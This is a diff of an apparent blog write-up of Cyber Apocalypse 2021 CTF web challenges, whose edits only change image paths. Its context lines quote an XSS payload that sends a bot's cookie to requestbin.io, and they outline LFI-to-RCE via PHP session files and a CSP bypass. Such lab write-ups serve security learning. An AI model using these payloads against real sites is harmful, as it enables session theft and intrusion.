@@ -14,7 +14,7 @@ Every challenge in the category was unique in its own way and nearly every singl
 
 The first step to exploiting a web application is always to determine what it actually does. In the case of Bug Report, for which we were given the source code, it is a simple web page that expects a URL, which a bot then opens once it's submitted, to presumably verify a bug.
 
-<img src="/assets/img/CyberApocalypse2021/br1.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
+<img src="/assets/images/posts/cyberApocalypse2021/br1.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
 
 Once you press report, a POST request is sent to the `/api/submit` endpoint, which takes the `url` parameter from the json request body and checks if it starts with `http://` or `https://` to verify that the input is indeed a url. If it is, the application calls the `visit_report` function, which activates the bot living on the backend. Once the bot's work is complete, we get a generic message for either success or error:
 
@@ -64,7 +64,7 @@ def page_not_found(error):
 
 Code like this always puts a smile on my face because it doesn't actually sanitize the URL request parameter before rendering it to the page. When we request a non-existent page on the web application, we get a simple html page: `URL http://localhost:1337/xss not found`. The obvious next step is to request a page with the html script tags to see if we have XSS - `http://localhost:1337/<script>alert('xss')</script>` and indeed we do:
 
-<img src="/assets/img/CyberApocalypse2021/br2.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
+<img src="/assets/images/posts/cyberApocalypse2021/br2.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
 
 Since we are provided with the source code, we can build the application docker container locally and test whether or not such a link will trigger XSS on the bot. We can test that by crafting a link that will navigate the bot to a non-existent page: 
 
@@ -89,7 +89,7 @@ http://127.0.0.1:1337/<script>document.location="https://requestbin.io/1234?cook
 
 And we successfully get the cookie back:
 
-<img src="/assets/img/CyberApocalypse2021/br3.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
+<img src="/assets/images/posts/cyberApocalypse2021/br3.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
 
 ## Local File Inclusion + RCE (Extortion)
 
@@ -115,7 +115,7 @@ sess_311f9d57ab0b8ad5c4fea8fe85f0f14e
 
 So far so good. Getting RCE with a PHP session cookie is a well-known technique, so how come only 192 teams out of 4740 solved it? Well, the problem is that when you look for the session file with LFI in the place it will most likely be in, you will discover that it isn't there. Payload All The Things has a section for this vulnerability that lists 2 places where the session file might be, however, it is located in neither:
 
-<img src="/assets/img/CyberApocalypse2021/extr1.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
+<img src="/assets/images/posts/cyberApocalypse2021/extr1.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
 
 As any real hacker would do, the solution was to go look around Stack Overflow, because of course, it has a [random page](https://stackoverflow.com/questions/4927850/location-for-session-files-in-apache-php) addressing exactly this. PHP uses the `session.save_path` configuration directive to determine where the PHP session files should be stored. In the case that this directive is empty or not set, PHP defaults to storing the session files in the local temporary directory, which in the case of Linux is `/tmp`. Knowing this, we can use our LFI to confirm this by requesting our session file with the `PHPSESSID` value appended to `sess_`:
 
@@ -181,13 +181,13 @@ def main():
 
 We run the exploit and get the magical `whoami` - `www-data`. Simply browse the directory and read the flag:
 
-<img src="/assets/img/CyberApocalypse2021/extr2.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
+<img src="/assets/images/posts/cyberApocalypse2021/extr2.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
 
 ## Blind XSS + CSP Bypass (The Galactic Times)
 
 The Galactic Times is a Node JS web application that hosts a galactic newspaper with spicy alien memes. When we deploy the application locally, we can explore the articles that are all located on the home page and we can also traverse to `/feedback`, which lets us submit comments to the website owners about the current newspaper edition.
 
-<img src="/assets/img/CyberApocalypse2021/gt1.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
+<img src="/assets/images/posts/cyberApocalypse2021/gt1.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
 
 Diving straight into the source code of the feedback functionality, we can see that it is made possible thanks to the POST `/api/submit` endpoint, which takes the request body as a feedback parameter, which is then fed into the `db.addFeedback` function. The database is then cleared and rebuilt with the `db.purgeData` function. As always, the application returns generic, non-verbose success or error message that we can't get any data from:
 
@@ -325,7 +325,7 @@ contentSecurityPolicy: {
 
 When a CSP source is set to `self`, it means it only accepts the local domain as the source. It can also specify whitelisted urls that are allowed to be used as a source for scripts such as `https://cdnjs.cloudflare.com/`. We now know the full extent of the CSP as it applies to arbitrary JavaScript - we can't inject any, we can only include code from `127.0.0.1` or `cdnjs.cloudflare.com`. Thankfully, Google has created the [Content Security Evaluator tool](https://csp-evaluator.withgoogle.com/), where we can examine the CSP for any issues:
 
-<img src="/assets/img/CyberApocalypse2021/gt3.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
+<img src="/assets/images/posts/cyberApocalypse2021/gt3.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
 
 Google's CSP evaluator alerted on a high-risk issue with the `script-src` policy - it whitelists a CDN that is known to host Angular libraries that can allow us to bypass this CSP. Whitelists are not the ultimate solution to creating a strong CSP because there are many ways in which they can be circumvented, such as open redirects or outdated libraries that can be included, such as the following Angular library, which we can include within the source of our `script` tag:
 
@@ -435,7 +435,7 @@ GET /12345?CHTB{f4k3_fl4g_f0r_t3st1ng}
 
 Emoji Voting was one of those challenges where you know what to do from the very beginning and implementing your solution is what takes time. Once again, we are given the source code for a web application running Node JS and are tasked with exploiting it. When we deploy the application, it appears to be a voting board for different emojis. A simple click on any one of the emojis increments its votes by 1.
 
-<img src="/assets/img/CyberApocalypse2021/emj1.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
+<img src="/assets/images/posts/cyberApocalypse2021/emj1.png" style="margin-left: auto; margin-right: auto; margin-bottom: 0; display: block;"/>
 
 The application backend is Node JS, but there is also some JavaScript running on the client-side. If we open the page HTML source, we can spot the `main.js` script being included. This script is repeatedly calling the `getEmojis` function with an interval of 5 seconds:
 
